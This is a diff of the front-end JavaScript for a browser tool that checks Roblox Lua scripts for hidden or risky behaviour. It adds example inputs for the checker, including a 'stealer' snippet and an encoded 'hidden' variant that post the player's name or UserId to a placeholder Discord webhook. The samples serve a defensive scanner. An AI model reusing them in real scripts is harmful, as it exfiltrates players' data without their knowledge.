@@ -2,32 +2,47 @@
   'use strict';
   var L = window.LuaScriptFucker, $ = function (id) { return document.getElementById(id); };
   var REPO = 'https://github.com/sxmoq/luascriptchecker';
-  // Paste your Discord invite between the quotes when it is ready, for example 'https://discord.gg/yourcode'.
-  var DISCORD_URL = '';
+  var DISCORD_URL = 'https://discord.gg/BqsNSjJ2b8';
   // Optional: address of your own download helper (see proxy-worker.js). Many script sites block direct downloads from a web page.
   var PROXY_URL = '';
 
   var VIEWS = {
-    dump: ['Dumper', 'Paste a script or a link. We read it, follow what it downloads, and tell you if it looks safe.'],
+    dump: ['Is this script safe?', 'Paste a Roblox script or a link to one. We read it, follow what it downloads, and tell you what it really does.'],
     clean: ['Deobfuscator', 'Turn an unreadable script into something you can read.'],
     byte: ['Bytecode', 'Read the text hidden inside compiled Luau or Lua files.'],
     api: ['API', 'Use the same tools from your own JavaScript.'],
-    hist: ['History', 'Scripts you recently dumped or checked.'],
+    hist: ['History', 'Scripts you recently checked.'],
     give: ['Contribute', 'Help make the scanner smarter.']
   };
   var NEEDS = { dump: 1 };
   function enc(s) { return s.replace(/[\s\S]/g, function (c) { return '\\' + c.charCodeAt(0); }); }
-  var SAMPLE = 'local Players = game:GetService("Players")\n' +
-    'loadstring(game:HttpGet("https://scriptblox.com/raw/Example-Hub_abc123"))()\n' +
-    'loadstring("' + enc('local hook="https://discord.com/api/webhooks/123/abc" game:GetService("HttpService"):PostAsync(hook, tostring(game.Players.LocalPlayer.UserId))') + '")()\n';
+  var EX = {
+    normal: 'local Players = game:GetService("Players")\nlocal plr = Players.LocalPlayer\nprint("Hello " .. plr.Name)\nplr.CharacterAdded:Connect(function(c) print("spawned") end)\n',
+    loader: 'loadstring(game:HttpGet("https://scriptblox.com/raw/Example-Hub_abc123"))()\n',
+    stealer: 'local hook = "https://discord.com/api/webhooks/123456/abcdef"\nlocal plr = game.Players.LocalPlayer\ngame:GetService("HttpService"):PostAsync(hook, plr.Name .. " " .. plr.UserId)\n',
+    hidden: 'local Players = game:GetService("Players")\nloadstring("' + enc('local hook="https://discord.com/api/webhooks/123/abc" game:GetService("HttpService"):PostAsync(hook, tostring(game.Players.LocalPlayer.UserId))') + '")()\n',
+    luarmor: 'script_key = "YOUR_KEY_HERE"\nloadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/0123456789abcdef0123456789abcdef.lua"))()\n'
+  };
 
   var src = '', fname = '', cur = null, tab = 'sum', layerIx = 0, catSel = 'all';
+
+  /* ---------- icons ---------- */
+  var SH = 'M12 3l8 3v6c0 5-3.5 8-8 9-4.5-1-8-4-8-9V6l8-3z';
+  var IC = {
+    vok: SH + 'M8.5 12l2.5 2.5 4.5-5', vbad: SH + 'M9.5 9.5l5 5M14.5 9.5l-5 5', vwarn: SH + 'M12 8v4.5M12 16h.01',
+    vq: SH + 'M9.8 9.6a2.3 2.3 0 014.4.9c0 1.4-2.2 1.8-2.2 3.2M12 16.6h.01',
+    lock: 'M7 11V8a5 5 0 0110 0v3M5 11h14v9H5zM12 15v2',
+    down: 'M12 4v11M7.5 10.5L12 15l4.5-4.5M5 19.5h14', up: 'M12 20V9M7.5 13.5L12 9l4.5 4.5M5 4.5h14',
+    hidden: 'M3 3l18 18M10.7 10.7a2 2 0 002.6 2.6M9.9 5.2A9.8 9.8 0 0112 5c5 0 8.5 4 9.5 7a13 13 0 01-2.6 3.9M6.1 6.1A13.5 13.5 0 002.5 12c1 3 4.5 7 9.5 7a9.7 9.7 0 004-.9',
+    info: 'M12 21a9 9 0 100-18 9 9 0 000 18zM12 8h.01M11 12h1v5h1', check: 'M5 12.5l4.5 4.5L19 7.5', warn: 'M12 4l9 16H3L12 4zM12 10v4M12 17h.01'
+  };
+  function svg(k) { return '<svg viewBox="0 0 24 24" aria-hidden="true"><path d="' + IC[k] + '"/></svg>'; }
 
   /* ---------- helpers ---------- */
   function esc(s) { return String(s).replace(/[&<>"]/g, function (c) { return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]; }); }
   function store(k, v) { try { if (v === undefined) return JSON.parse(localStorage.getItem(k)); localStorage.setItem(k, JSON.stringify(v)); } catch (e) { return null; } }
   function msg(t) { $('msg').textContent = t || ''; }
-  function need() { if (!src.trim()) { msg('Add a script first: paste code above or drop a file on the box.'); return false; } msg(''); return true; }
+  function need() { if (!src.trim()) { msg('Add a script first: paste code or a link above, or drop a file on the box.'); return false; } msg(''); return true; }
   function dl(name, text) {
     var a = document.createElement('a'); a.href = URL.createObjectURL(new Blob([text], { type: 'text/plain' }));
     a.download = name; document.body.appendChild(a); a.click(); a.remove();
@@ -45,7 +60,6 @@
     h = h.slice(0, 20);
     if (store('lsf_hist', h) === null && !store('lsf_hist')) store('lsf_hist', h.slice(0, 5));
   }
-
   function setSrc(text, name) {
     src = text; fname = name || ''; $('inp').value = text;
     $('fname').textContent = name || 'Script';
@@ -56,33 +70,39 @@
   function show(v) {
     document.querySelectorAll('.side button').forEach(function (b) { b.classList.toggle('on', b.dataset.v === v); });
     document.querySelectorAll('.view').forEach(function (s) { s.hidden = s.id !== 'v-' + v; });
-    $('inputCard').hidden = !NEEDS[v];
+    $('inputCard').hidden = !NEEDS[v]; $('examples').hidden = !NEEDS[v];
     $('title').textContent = VIEWS[v][0]; $('sub').textContent = VIEWS[v][1];
     msg('');
     if (v === 'hist') hist();
   }
 
-  /* ---------- shared report pieces ---------- */
+  /* ---------- report pieces ---------- */
+  var VICON = { ok: 'vok', bad: 'vbad', warn: 'vwarn', pending: 'vq', dynamic: 'vq', hidden: 'vq', protected: 'lock' };
   function bandHtml(d, extra) {
     var vd = d.verdict, cls = { bad: 'bad', warn: 'warn', ok: 'ok', unknown: 'unk' }[vd.state];
-    var num = vd.state === 'unknown' ? '<b>?</b><span>not enough to judge</span>' : '<b>' + d.score + '</b><span>risk out of 100</span>';
-    return { title: vd.title, html: '<div class="verdict ' + cls + '"><div><h2>' + esc(vd.title) + '</h2><p>' + esc(vd.advice) + '</p></div>' +
-      '<div class="vnum">' + num + '</div>' + (extra || '') + '</div>' };
+    var lit = { ok: 1, warn: 2, bad: 3, unknown: 0 }[vd.state];
+    var meter = '<div class="vmeter' + (lit ? '' : ' dash') + '"><div class="segs">' + [1, 2, 3].map(function (n) { return '<i' + (n <= lit ? ' class="on"' : '') + '></i>'; }).join('') + '</div>' +
+      (lit ? '<div class="vlabels"><span>Low</span><span>Medium</span><span>High</span></div><div class="vscore">Risk score <b>' + d.score + '</b> out of 100</div>'
+        : '<div class="vscore">Not enough to judge yet</div>') + '</div>';
+    return { title: vd.title, html: '<div class="verdict ' + cls + '"><div class="vhead"><span class="vicon">' + svg(VICON[vd.kind] || 'vq') + '</span><div><h2>' + esc(vd.title) + '</h2><p>' + esc(vd.advice) + '</p></div></div>' +
+      meter + (extra || '') + '</div>' };
+  }
+  function itemHtml(f, withLayer) {
+    var where = 'line ' + f.line + (withLayer && f.layer > 0 ? ' · in: ' + f.via : '');
+    return '<div class="item"><span class="dot l' + f.level + '"></span><div><div class="ih"><b>' + esc(f.title) + '</b><span class="muted">' +
+      (f.count > 1 ? f.count + ' times · ' : '') + where + '</span></div><p>' + esc(f.why) + '</p>' +
+      (f.snippet ? '<code class="snip">' + esc(f.snippet) + '</code>' : '') + '</div></div>';
   }
   function findingsHtml(list, withLayer) {
-    if (!list.length) return '<p class="empty">Nothing risky matched.</p>';
-    return list.map(function (f) {
-      var where = 'line ' + f.line + (withLayer && f.layer > 0 ? ' · in: ' + f.via : '');
-      return '<div class="item"><span class="dot l' + f.level + '"></span><div><div class="ih"><b>' + esc(f.title) + '</b><span class="muted">' +
-        (f.count > 1 ? f.count + ' times · ' : '') + where + '</span></div><p>' + esc(f.why) + '</p>' +
-        (f.snippet ? '<code class="snip">' + esc(f.snippet) + '</code>' : '') + '</div></div>';
-    }).join('');
+    var warns = list.filter(function (f) { return f.level >= 2; }), notes = list.filter(function (f) { return f.level < 2; });
+    var h = warns.length ? warns.map(function (f) { return itemHtml(f, withLayer); }).join('') : '<p class="empty" style="padding:24px 0 8px">Nothing risky matched.</p>';
+    if (notes.length) h += '<details class="notes"><summary>Good to know <span class="muted">(' + notes.length + ', normal in most scripts)</span></summary>' + notes.map(function (f) { return itemHtml(f, withLayer); }).join('') + '</details>';
+    return h;
   }
 
-  /* ---------- dumper ---------- */
+  /* ---------- checking ---------- */
   var ROLE = { run: 'Downloads and runs', send: 'Sends data to', fetch: 'Downloads', mention: 'Mentioned' };
-  var CLS_CHIP = { hub: 'hub', exfil: 'bad', tracker: 'bad', paste: 'warn', tunnel: 'warn', short: 'warn', roblox: 'ok' };
-
+  var CLS_CHIP = { hub: 'hub', gate: 'hub', lib: 'ok', exfil: 'bad', tracker: 'bad', paste: 'warn', tunnel: 'warn', short: 'warn', roblox: 'ok' };
   var remote = {}, tried = {}, runId = 0, histFor = -1;
   function autoOn() { return $('autoDl').checked; }
 
@@ -127,7 +147,15 @@
   }
 
   function doesHtml(d) {
-    return '<h3>What this script does</h3><ul class="does">' + d.says.map(function (s) { return '<li>' + esc(s) + '</li>'; }).join('') + '</ul>';
+    return '<h3>What this script does</h3><ul class="does">' + d.says.map(function (s) { return '<li class="k-' + s.kind + '">' + svg(s.kind) + '<span>' + esc(s.text) + '</span></li>'; }).join('') + '</ul>';
+  }
+  var TIPS = {
+    protected: ['Only use scripts from creators with a real community: a Discord with members, reviews, a history.', 'Try it on an alt account first, never on your main.', 'Never type your Roblox password or cookie into anything a script shows you.'],
+    hidden: ['Only use it if you trust who made it. If a stranger sent it to you, don’t.', 'Try it on an alt account first, never on your main.', 'Never type your Roblox password or cookie into anything a script shows you.']
+  };
+  function tipsHtml(d) {
+    var t = TIPS[d.verdict.kind]; if (!t) return '';
+    return '<div class="tips"><b>How to stay safe</b><ul>' + t.map(function (x) { return '<li>' + esc(x) + '</li>'; }).join('') + '</ul></div>';
   }
   function pendingHtml(d) {
     if (!d.pending.length) return '';
@@ -146,15 +174,20 @@
         '<textarea class="paste" spellcheck="false" aria-label="Script text"></textarea><div class="row"><button class="btn sm solid" data-add="' + i + '" type="button">Check it</button></div></details></div>';
     }).join('');
   }
+  function busyHtml(d) {
+    var p = d.pending.filter(function (x) { return tried[x.fetchUrl] === 'loading'; })[0];
+    return p ? '<div class="busy" role="status"><i></i><span>Downloading the script from ' + esc(p.name) + '…</span></div>' : '';
+  }
 
   function render() {
     var d = cur, o = d.obfuscation, links = d.loaders.length, n = d.meta.layers;
+    var notes = d.findings.length;
     var facts = '<div class="facts"><span><b>' + esc(o.label) + '</b>' + (o.families.length ? ' (' + esc(o.families.join(', ')) + ')' : '') + '</span>' +
       '<span><b>' + n + '</b> extra ' + (n === 1 ? 'layer' : 'layers') + ' read</span>' +
       '<span><b>' + links + '</b> ' + (links === 1 ? 'link' : 'links') + '</span>' +
       '<span><b>' + d.meta.lines + '</b> ' + (d.meta.lines === 1 ? 'line' : 'lines') + ', ' + (d.meta.bytes / 1024).toFixed(1) + ' KB</span></div>';
-    var tabs = [['sum', 'Details', d.findings.length], ['links', 'Links', links], ['layers', 'Layers', d.layers.length], ['strs', 'Strings', d.strings.length], ['calls', 'Calls', d.calls.length]];
-    $('dumpOut').innerHTML = bandHtml(d, facts).html + doesHtml(d) + pendingHtml(d) +
+    var tabs = [['sum', 'Details', notes], ['links', 'Links', links], ['layers', 'Code', d.layers.length], ['strs', 'Text', d.strings.length], ['calls', 'Functions', d.calls.length]];
+    $('dumpOut').innerHTML = busyHtml(d) + bandHtml(d, facts).html + doesHtml(d) + tipsHtml(d) + pendingHtml(d) +
       '<div class="tabs" role="tablist">' + tabs.map(function (t) {
         return '<button class="tab' + (t[0] === tab ? ' on' : '') + '" role="tab" data-tab="' + t[0] + '">' + t[1] + '<i>' + t[2] + '</i></button>';
       }).join('') + '</div><div class="panel" id="tabBody"></div>' +
@@ -166,27 +199,27 @@
     var d = cur, h = '';
     if (tab === 'sum') {
       var o = d.obfuscation;
-      h += (d.meta.layers ? '<div class="hint">Extra code was unpacked or downloaded and checked too. Open the <b>Layers</b> tab to read it.</div>' : '') + findingsHtml(d.findings, true);
+      h += (d.meta.layers ? '<div class="hint">Extra code was unpacked or downloaded and checked too. Open the <b>Code</b> tab to read it.</div>' : '') + findingsHtml(d.findings, true);
       h += '<h3>Obfuscation</h3><div><b>' + esc(o.label) + '</b> <span class="muted">(score ' + o.score + ' out of 100' + (o.families.length ? ', looks like ' + esc(o.families.join(', ')) : '') + ')</span>' +
         (o.signals.length ? '<ul class="sig">' + o.signals.map(function (s) { return '<li>' + esc(s) + '</li>'; }).join('') + '</ul>' : '<p class="muted" style="margin:4px 0 0">Nothing here looks scrambled.</p>') + '</div>';
       if (d.iocs.ips.length) h += '<h3>IP addresses</h3><ul class="list">' + d.iocs.ips.map(function (ip) { return '<li><code>' + esc(ip) + '</code></li>'; }).join('') + '</ul>';
       if (d.iocs.assets.length) h += '<h3>Roblox asset IDs</h3><ul class="list">' + d.iocs.assets.map(function (a) { return '<li><code>' + esc(a.id) + '</code><span class="chip">' + esc(a.kind) + '</span></li>'; }).join('') + '</ul>';
     } else if (tab === 'links') {
-      h += '<div class="hint">Links are never opened here. To see what a loader really runs, open it yourself somewhere safe and paste the code into this page.</div>';
+      h += '<div class="hint">Links are never opened for you unless you press Download. We never run what they return, only read it.</div>';
       h += d.loaders.length ? d.loaders.map(function (l, i) {
         return '<div class="lk"><span class="role ' + l.role + '">' + ROLE[l.role] + '</span><div><div class="meta"><span class="chip ' + (CLS_CHIP[l.cls] || '') + '">' + esc(l.name) + '</span>' +
-          (l.layer ? '<span class="chip">layer ' + l.layer + '</span>' : '') + (l.count > 1 ? '<span class="chip">' + l.count + ' times</span>' : '') + '</div><code>' + esc(l.url) + '</code></div>' +
+          (l.resolved ? '<span class="chip ok">read</span>' : '') + (l.layer ? '<span class="chip">layer ' + l.layer + '</span>' : '') + (l.count > 1 ? '<span class="chip">' + l.count + ' times</span>' : '') + '</div><code>' + esc(l.url) + '</code></div>' +
           '<button class="btn sm" data-copy="' + i + '" type="button">Copy</button></div>';
       }).join('') : '<p class="empty">No links found.</p>';
     } else if (tab === 'layers') {
       h += '<div class="layers">' + d.layers.map(function (ly, i) {
-        return '<button class="btn sm' + (i === layerIx ? ' on' : '') + '" data-layer="' + i + '" type="button">' + (i === 0 ? 'Original (cleaned)' : 'Layer ' + i) + '</button>';
+        return '<button class="btn sm' + (i === layerIx ? ' on' : '') + '" data-layer="' + i + '" type="button">' + (i === 0 ? 'Your script (cleaned)' : 'Layer ' + i) + '</button>';
       }).join('') + '</div>';
       var ly = d.layers[layerIx];
       h += '<div class="codewrap"><div class="etop"><span class="fname">' + esc(ly.via) + '</span><span class="muted">' + plural(ly.lines, 'line') + ', ' + (ly.size / 1024).toFixed(1) + ' KB</span><span class="grow"></span>' +
         '<button class="btn sm" data-act="copy-layer" type="button">Copy</button><button class="btn sm" data-act="save-layer" type="button">Save .lua</button></div>' +
         '<textarea class="codebox" id="layerBox" readonly spellcheck="false" aria-label="Decoded code"></textarea></div>' +
-        (layerIx === 0 ? '<p class="muted">Escapes, split strings and hex numbers are decoded so the text is readable. Layers below are code that was stored inside strings.</p>' : '');
+        (layerIx === 0 ? '<p class="muted">Escapes, split strings and hex numbers are decoded so the text is readable. Layers below are code that was stored inside strings or downloaded.</p>' : '');
     } else if (tab === 'strs') {
       h += '<div class="toolbar"><input class="srch" id="strQ" type="search" placeholder="Search text" aria-label="Search text"><label class="chk"><input type="checkbox" id="strHid"> Only text revealed by decoding</label></div><ul class="list" id="strList"></ul>';
     } else {
@@ -218,7 +251,7 @@
   function reportText() {
     var d = cur;
     var out = ['LuaScriptFucker report', 'File: ' + (fname || 'pasted script'), 'Verdict: ' + d.verdict.title, d.verdict.advice, '', 'What this script does:']
-      .concat(d.says.map(function (s) { return '- ' + s; }));
+      .concat(d.says.map(function (s) { return '- ' + s.text; }));
     out.push('', 'Findings:');
     out = out.concat(d.findings.length ? d.findings.map(function (f) { return '- ' + f.title + ' (line ' + f.line + ', ' + f.via + '): ' + f.why; }) : ['- none']);
     out.push('', 'Links:');
@@ -259,7 +292,7 @@
       var title = res.kind;
       if (res.strings.length) {
         var d = L.dump(texts), b = bandHtml(d); title = b.title;
-        html += b.html + '<h3>What was found</h3>' + findingsHtml(d.findings, false) + '<h3>Text found (' + res.strings.length + ')</h3><ul class="list">' +
+        html += b.html + doesHtml(d) + '<h3>What was found</h3>' + findingsHtml(d.findings, false) + '<h3>Text found (' + res.strings.length + ')</h3><ul class="list">' +
           res.strings.slice(0, 300).map(function (t) { return '<li><code>' + esc(short(t, 180)) + '</code></li>'; }).join('') + '</ul>';
       } else html += '<p class="empty">No readable text found in this file.</p>';
       $('byteOut').innerHTML = html;
@@ -273,7 +306,7 @@
     var h = store('lsf_hist') || [];
     $('histOut').innerHTML = h.length ? h.map(function (e, i) {
       return '<div class="hrow"><span class="tag">' + esc(e.kind) + '</span><div class="grow"><b>' + esc(e.name) + '</b><div class="muted">' + esc(e.summary) + ' · ' + new Date(e.t).toLocaleString() + '</div></div><button class="btn sm" data-i="' + i + '" type="button">Open</button></div>';
-    }).join('') : '<p class="empty">Nothing here yet. Dump a script and it shows up here.</p>';
+    }).join('') : '<p class="empty">Nothing here yet. Check a script and it shows up here.</p>';
   }
 
   /* ---------- wiring ---------- */
@@ -282,8 +315,11 @@
 
   $('inp').addEventListener('input', function () { setSrc($('inp').value, ''); });
   $('bOpen').addEventListener('click', function () { $('file').click(); });
-  $('bSample').addEventListener('click', function () { setSrc(SAMPLE, 'example.lua'); msg(''); });
-  $('bClear').addEventListener('click', function () { setSrc('', ''); cur = null; $('dumpOut').innerHTML = ''; msg(''); $('inp').focus(); });
+  $('bClear').addEventListener('click', function () { setSrc('', ''); cur = null; runId++; $('dumpOut').innerHTML = ''; msg(''); $('inp').focus(); });
+  $('examples').addEventListener('click', function (e) {
+    var b = e.target.closest('button[data-ex]'); if (!b) return;
+    setSrc(EX[b.dataset.ex], ''); msg(''); dump();
+  });
 
   function readText(f) { if (!f) return; var r = new FileReader(); r.onload = function () { setSrc(String(r.result), f.name); msg(''); }; r.readAsText(f); }
   $('file').addEventListener('change', function (e) { readText(e.target.files[0]); e.target.value = ''; });
@@ -313,8 +349,7 @@
   });
   $('bWipe').addEventListener('click', function () { store('lsf_hist', []); hist(); });
 
-  if (DISCORD_URL) $('discordBtn').href = DISCORD_URL;
-  $('discordBtn').addEventListener('click', function (e) { if (!DISCORD_URL) { e.preventDefault(); msg('The Discord invite link has not been added yet. Check back soon.'); } });
+  $('discordBtn').href = DISCORD_URL; $('railDiscord').href = DISCORD_URL;
 
   $('gSend').addEventListener('click', function () {
     var t = $('gType').value, title = $('gTitle').value.trim(), body = $('gBody').value.trim();
